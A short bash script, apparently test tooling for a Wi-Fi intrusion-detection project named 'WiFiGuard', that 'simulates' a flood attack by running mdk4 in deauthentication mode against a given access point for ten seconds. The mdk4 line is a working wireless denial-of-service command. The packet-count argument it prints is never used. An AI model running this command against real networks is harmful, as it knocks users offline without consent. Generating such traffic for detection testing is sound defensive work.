#!/bin/bash
INTERFACE="${1:-wlan1mon}"
AP_MAC="${2:-AA:BB:CC:DD:EE:03}"
COUNT="${3:-5000}"

echo "[WiFiGuard] 模拟Flood泛洪攻击..."
echo "  接口: $INTERFACE"
echo "  目标AP: $AP_MAC"
echo "  包数: $COUNT"

sudo mdk4 "$INTERFACE" d -B "$AP_MAC" -c 1 &
PID=$!
sleep 10
sudo kill $PID 2>/dev/null
echo "  攻击结束"
